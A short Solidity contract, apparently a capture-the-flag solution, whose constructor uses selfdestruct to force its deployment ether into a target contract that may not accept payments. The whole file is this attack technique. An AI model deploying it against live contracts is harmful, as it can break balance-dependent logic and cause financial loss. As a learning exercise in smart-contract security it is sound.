// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    
    constructor(address payable _targetInstanceAddress) payable {
        // selfdestruct takes 100% of the deployment value and forces it into the target
        selfdestruct(_targetInstanceAddress);
    }
}